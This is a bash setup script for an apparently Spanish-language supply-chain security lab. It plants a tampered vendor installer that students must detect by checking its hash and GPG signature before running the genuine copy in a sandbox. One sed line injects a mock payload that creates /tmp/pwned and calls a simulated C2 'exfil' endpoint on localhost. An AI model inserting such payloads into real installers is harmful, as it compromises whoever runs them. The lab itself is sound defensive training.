#!/usr/bin/env bash
# Lab 146 (Mr. Robot M5): el CD de origen no confiable.
# Llega un instalador "de proveedor". La copia entregada está MANIPULADA
# (sha256 y firma no cuadran). El alumno lo detecta, usa la copia legítima del
# mirror, verifica firma + hash y la ejecuta en una sandbox con bubblewrap.
set -e
export HOME=/root
H=/home/analista
TOKEN=ALLSAFE-OK-7f3a

install -d -m 0755 /srv/mirror /opt/entrega /opt/vendor-gnupg
chmod 0700 /opt/vendor-gnupg

# --- clave GPG del proveedor --------------------------------------------------
cat > /tmp/keygen <<'K'
%no-protection
Key-Type: RSA
Key-Length: 2048
Name-Real: Allsafe Software Supply
Name-Email: release@allsafe.example
Expire-Date: 0
%commit
K
gpg --homedir /opt/vendor-gnupg --batch --gen-key /tmp/keygen >/dev/null 2>&1
rm -f /tmp/keygen
gpg --homedir /opt/vendor-gnupg --armor --export release@allsafe.example > /opt/entrega/vendor.pub

# --- instalador LEGÍTIMO (en el mirror) ---------------------------------------
cat > /srv/mirror/instalador.sh <<SH
#!/usr/bin/env bash
# Instalador legítimo de Allsafe. No requiere red para instalar.
echo "Allsafe installer v1.4"
if curl -s --max-time 2 http://127.0.0.1:9146/beacon >/dev/null 2>&1; then
  echo "contacto=ok"
else
  echo "contacto=sin-red"
fi
DEST="\${DESTINO:-/opt/app}"
mkdir -p "\$DEST"
echo "$TOKEN \$(date -u +%FT%TZ)" > "\$DEST/OK"
echo "instalado en \$DEST"
SH
chmod 0755 /srv/mirror/instalador.sh

# Firma detached + SHA256SUMS sobre la copia buena.
gpg --homedir /opt/vendor-gnupg --batch --yes --armor --detach-sign \
    -o /srv/mirror/instalador.sh.asc /srv/mirror/instalador.sh
( cd /srv/mirror && sha256sum instalador.sh > SHA256SUMS )

# --- copia ENTREGADA (manipulada): mismo nombre, mete una línea maliciosa -----
cp /srv/mirror/instalador.sh /opt/entrega/instalador.sh
# Insertar carga maliciosa tras el shebang: deja /tmp/pwned si alguien la corre.
sed -i '1a touch /tmp/pwned 2>/dev/null; curl -s --max-time 2 http://127.0.0.1:9146/exfil?k=secreto >/dev/null 2>&1 || true' \
    /opt/entrega/instalador.sh
# Entregan la firma y los hashes de la copia BUENA (no cuadran con la manipulada).
cp /srv/mirror/instalador.sh.asc /opt/entrega/instalador.sh.asc
cp /srv/mirror/SHA256SUMS        /opt/entrega/SHA256SUMS

# --- endpoint "phone-home" (para que la sandbox tenga algo que NO alcanzar) ---
cat > /etc/systemd/system/beacon.service <<'U'
[Unit]
Description=Endpoint de telemetría/C2 simulado (127.0.0.1:9146)
[Service]
ExecStart=/usr/bin/python3 -m http.server 9146 --bind 127.0.0.1
Restart=always
[Install]
WantedBy=multi-user.target
U
systemctl enable --now beacon

# Carpeta de instalación del alumno (destino de la sandbox).
install -d -o analista -g analista -m 0755 $H/instalado

mkdir -p $H/ticket
cat > $H/ticket/SUP-146.txt <<TXT
SUP-146 · allsafe-146 · instalador llegado por un medio no confiable
Un proveedor mandó un instalador en un CD (carpeta /opt/entrega). Antes de
ejecutar NADA de origen externo: verificar y aislar.

Mirror oficial del proveedor: /srv/mirror (instalador.sh, .asc, SHA256SUMS)
Clave pública del proveedor:  /opt/entrega/vendor.pub

1. Comprueba la copia entregada (/opt/entrega/instalador.sh): sha256 contra
   SHA256SUMS y firma GPG. ¿Es íntegra? ¿La firma es válida?
2. ~/veredicto.txt:
     entregado_integro=<si|no>
     firma_valida=<si|no>
     sha_correcto=<sha256 del instalador legítimo del mirror>
3. Ejecuta el instalador LEGÍTIMO (el del mirror, ya verificado) dentro de una
   sandbox con bubblewrap SIN red, con la salida en ~/salida-sandbox.txt y el
   destino montado en ~/instalado. NO ejecutes la copia entregada.
TXT
chown -R analista:analista $H/ticket
echo "Lab 146 plantado. token=$TOKEN"
